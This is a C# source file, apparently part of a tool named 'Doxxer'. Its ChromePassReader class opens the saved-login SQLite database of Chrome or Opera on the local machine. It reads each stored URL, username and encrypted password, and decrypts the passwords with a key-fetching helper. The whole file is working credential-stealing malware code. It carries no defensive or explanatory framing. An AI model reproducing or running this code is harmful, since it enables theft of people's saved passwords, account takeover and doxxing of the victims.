using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;

namespace Doxxer;

class ChromePassReader 
{

    public IEnumerable<CredentialModel> ReadPasswords(String browser)
    {
        var result = new List<CredentialModel>();
        String location = null;

        switch (browser)
        {
            case "chrome":
                location = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                           "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
                break;
            
            case "opera":
                location = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                           "\\..\\Roaming\\Opera Software\\Opera Stable\\Login Data";
                break;
        }
        

        if (File.Exists(location))
        {
            using (var conn = new SQLiteConnection($"Data Source={location};"))
            {
                conn.Open();
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                    using (var reader = cmd.ExecuteReader())
                    {
                        if (reader.HasRows)
                        {
                            var key = GCDecryptor.GetKey();
                            while (reader.Read())
                            {
                                byte[] nonce, ciphertextTag;
                                var encryptedData = GetBytes(reader, 2);
                                GCDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                                var pass = GCDecryptor.Decrypt(ciphertextTag, key, nonce);

                                result.Add(new CredentialModel()
                                {
                                    Url = reader.GetString(0),
                                    Username = reader.GetString(1),
                                    Password = pass
                                });
                            }
                        }
                    }
                }

                conn.Close();
            }
        }
        else
        {
            //ADD A WARNING THAT IT WASNT FOUND
        }

        return result;
    }

    private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
    {
        const int CHUNK_SIZE = 2 * 1024;
        byte[] buffer = new byte[CHUNK_SIZE];
        long bytesRead;
        long fieldOffset = 0;
        using (MemoryStream stream = new MemoryStream())
        {
            while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
            {
                stream.Write(buffer, 0, (int)bytesRead);
                fieldOffset += bytesRead;
            }

            return stream.ToArray();
        }
    }
}